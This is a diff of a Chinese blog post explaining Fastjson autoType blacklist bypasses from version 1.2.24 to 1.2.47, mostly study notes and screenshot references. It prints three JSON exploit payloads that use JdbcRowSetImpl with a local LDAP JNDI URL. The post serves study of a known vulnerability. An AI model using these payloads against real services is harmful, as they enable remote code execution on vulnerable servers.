@@ -74,43 +74,44 @@
 
 
 
-<h1 id="Fastjson学他妈的"><a href="#Fastjson学他妈的" class="headerlink" title="Fastjson学他妈的"></a>Fastjson学他妈的</h1><p>最近时间比较多，想把别人都会的学一下，至少看起来不那么菜…</p>
+<h1 id="Fastjson学他妈的"><a href="#Fastjson学他妈的" class="headerlink" title="Fastjson学他妈的"></a>Fastjson学他妈的</h1><p>最近时间比较多,想把别人都会的学一下,至少看起来不那么菜…</p>
+<p>心态崩了,oss上的图片被覆盖掉了,截图都重新截了,可能忽略了当时思考的一些东西,裂开了</p>
 <h2 id="1-2-24-lt-fastjson-lt-1-2-25"><a href="#1-2-24-lt-fastjson-lt-1-2-25" class="headerlink" title="1.2.24 &lt; fastjson &lt;= 1.2.25"></a>1.2.24 &lt; fastjson &lt;= 1.2.25</h2><p>开启autoTypeSupport</p>
-<p>引入了黑白名单的判断，如果开启了autoTypeSupport，或指定了期望类，那么就先进行白名单匹配，如果没匹配到，再进行黑名单匹配</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon-2.png"></p>
-<p>看下loadClass，处理了几种字段描述符，后面几种绕过也是围绕这里来展开的</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon-1.png"></p>
+<p>引入了黑白名单的判断,如果开启了autoTypeSupport,或指定了期望类,那么就先进行白名单匹配,如果没匹配到,再进行黑名单匹配,这里注意判断是否在黑白名单中的方式是<code>startsWith</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon(3).png"></p>
+<p>看下loadClass,递归处理了几种字段描述符,后面几种绕过也是围绕这里来展开的</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon(4).png"></p>
+<p>通过分析我们不难得到,如果我们利用描述符去绕过<code>className.startsWith</code>的黑名单判断就能绕过判断。</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="1-2-25-lt-fastjson-lt-1-2-42"><a href="#1-2-25-lt-fastjson-lt-1-2-42" class="headerlink" title="1.2.25 &lt; fastjson &lt;= 1.2.42"></a>1.2.25 &lt; fastjson &lt;= 1.2.42</h2><p>黑名单不做明文展示，做了hash处理，并且修复了绕过问题，这里先进行一次去除<code>L和;</code>但是可以双写绕过</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon-3.png"></p>
+<h2 id="1-2-25-lt-fastjson-lt-1-2-42"><a href="#1-2-25-lt-fastjson-lt-1-2-42" class="headerlink" title="1.2.25 &lt; fastjson &lt;= 1.2.42"></a>1.2.25 &lt; fastjson &lt;= 1.2.42</h2><p>黑名单不做明文展示,做了hash处理,并且修复了绕过问题,这里先进行一次去除<code>L和;</code>但是可以双写绕过,毕竟用的是递归处理</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon(5).png"></p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="1-2-42-lt-fastjson-lt-1-2-43"><a href="#1-2-42-lt-fastjson-lt-1-2-43" class="headerlink" title="1.2.42 &lt; fastjson &lt;= 1.2.43"></a>1.2.42 &lt; fastjson &lt;= 1.2.43</h2><p>写到这里去忙别的了，连续两天保存丢失，心态崩了，就写的简单点</p>
-<p>这个版本主要是数组绕过，主要代码如下，猜测<code>@type</code>指定了一个数组，后面需要跟一个数组对象（没太看懂解析规则</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon.png"></p>
-<p>然后去判断下一个字符是否是<code>&#123;或者,</code>如果都不是则会进入判断，抛出异常、可以注意到这里的异常抛出了版本号，这也是fastjson高版本获取精确版本的小技巧，具体可以参考<a target="_blank" rel="noopener" href="http://b1ue.cn/archives/402.html">浅蓝师傅的博客</a>，这里的<code>,</code>会被前面判断空删除，所以这里可以用<code>&#123;</code>不进入这层判断。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon-1.png"></p>
-<p>然后就可以得到完整payload，这里<code>@type</code>后可以直接跟<code>[&#123;</code>这里没太看懂，大概就是下一个符号直接去找<code>[</code>了</p>
-<p>中间也发现没有判断<code>,</code>可以写这样的畸形payload，大概是把com.sun.rowset.JdbcRowSetImpl解析成数组后，要去找<code>[]</code>符号？</p>
+<h2 id="1-2-42-lt-fastjson-lt-1-2-43"><a href="#1-2-42-lt-fastjson-lt-1-2-43" class="headerlink" title="1.2.42 &lt; fastjson &lt;= 1.2.43"></a>1.2.42 &lt; fastjson &lt;= 1.2.43</h2><p>写到这里去忙别的了,连续两天保存丢失,心态崩了,就写的简单点</p>
+<p>这个版本主要是数组绕过,主要代码如下,猜测<code>@type</code>指定了一个数组,后面需要跟一个数组对象（没太看懂解析规则</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon(6).png"></p>
+<p>然后去判断下一个字符是否是<code>&#123;或者,</code>如果都不是则会进入判断,抛出异常、可以注意到这里的异常抛出了版本号,这也是fastjson高版本获取精确版本的小技巧,具体可以参考<a target="_blank" rel="noopener" href="http://b1ue.cn/archives/402.html">浅蓝师傅的博客</a>,这里的<code>,</code>会被前面判断空删除,所以这里可以用<code>&#123;</code>不进入这层判断。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon(7).png"></p>
+<p>然后就可以得到完整payload,这里<code>@type</code>后可以直接跟<code>[&#123;</code>这里没太看懂,大概就是下一个符号直接去找<code>[</code>了</p>
+<p>中间也发现没有判断<code>,</code>可以写这样的畸形payload,大概是把com.sun.rowset.JdbcRowSetImpl解析成数组后,要去找<code>[]</code>符号？</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[,,,,,&#123;<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson &lt;= 1.2.47"></a>fastjson &lt;= 1.2.47</h2><p>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</p>
 <p>1.2.33 &lt;= fastjson &lt;= 1.2.47 无限制</p>
-<p>通过缓存来通杀，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
-<p>首先看到 为什么低版本需要开启AutoTypeSupport，低版本中，判断黑名单的逻辑是直接判断字符串，如果开启autotype会因为匹配到黑名单抛出异常</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon-2.png"></p>
-<p>但是高版本中，加入了缓存判断，所以开启autotype也不会抛出异常</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon1.png"></p>
-<p>然后就是看他如何利用缓存来绕过的，这里是关键代码，在两次黑白名单中间，需要从这里逃逸出去，否则进入下面的黑名单判断必会抛出异常，</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon2.png"></p>
-<p>接下来fastjson会去将<code>@type</code>指定的类进行反序列化，通过预设的一个<code>IdentityHashMap</code>中去取，这里指定了<code>@type</code>为class类，在<code>PaserConfig</code>中的<code>initDeserializers</code>方法中初始化预设了很多类，其中<code>class</code>类就是用<code>MiscCodec</code>类去解析</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon3.png"></p>
-<p>这个绕过分析应该自己跟一边，不过这里因为中间很多事情一直在打断，断断续续写了三四天，中间忘记保存了两次，所以很粗糙的略过了=</p>
-<p>可以参考<a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/#8-fastjson-1268">素18师傅</a>的和<a target="_blank" rel="noopener" href="https://lalajun.github.io/2019/12/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-fastjson/">这位师傅</a>的文章</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对fastjson的绕过大概有个概念了，知道怎么打，payload为什么这样写，原理是什么</p>
-<p>虽然有些地方还看的不是太懂，但至少还是去跟了，后面慢慢来吧。</p>
-<p>关于1.2.68绕过，我想后面跟任意文件写入一起分析，趁着这段时间多学一点东西吧。</p>
+<p>通过缓存来通杀,可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
+<p>首先看到 为什么低版本需要开启AutoTypeSupport,低版本中,判断黑名单的逻辑是直接判断字符串,如果开启autotype会因为匹配到黑名单抛出异常</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/carbon(8).png"></p>
+<p>但是高版本中,加入了缓存判断,所以开启autotype也不会抛出异常</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211019162850.png"></p>
+<p>然后就是看他如何利用缓存来绕过的,这里是关键代码,在两次黑白名单中间,需要从这里逃逸出去,否则进入下面的黑名单判断必会抛出异常,</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211019163120.png"></p>
+<p>接下来fastjson会去将<code>@type</code>指定的类进行反序列化,通过预设的一个<code>IdentityHashMap</code>中去取,这里指定了<code>@type</code>为class类,在<code>PaserConfig</code>中的<code>initDeserializers</code>方法中初始化预设了很多类,其中<code>class</code>类就是用<code>MiscCodec</code>类去解析</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211019170234.png"></p>
+<p>这个绕过分析最好自己重新跟一遍,这里因为中间很多事情一直在打断,断断续续写了三四天,中间忘记保存了两次,而且图床把我图片覆盖了，所以可能图不对文，不过大概的执行顺序图片上都标注了，应该还算清晰吧，如果实在不能理解，可以参考<a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/#8-fastjson-1268">素18师傅</a>的和<a target="_blank" rel="noopener" href="https://lalajun.github.io/2019/12/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-fastjson/">这位师傅</a>的文章，抱拳了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对fastjson的绕过大概有个概念了,知道怎么打,payload为什么这样写,原理是什么</p>
+<p>虽然有些地方还看的不是太懂,但至少还是去跟了,后面慢慢来吧。</p>
+<p>关于1.2.68绕过,我想后面跟任意文件写入一起分析,趁着这段时间多学一点东西吧。</p>
 
 
 <div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
@@ -118,7 +119,7 @@
 
 </article>
 
-
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><div class="line"></div><a id="prev" href="/2021/10/17/fastjson_2/">fastjson-2<span class="note">较新</span></a><div class="line"></div><a id="more" href="/archives">检索全部文章</a></section></div>
 
 
 
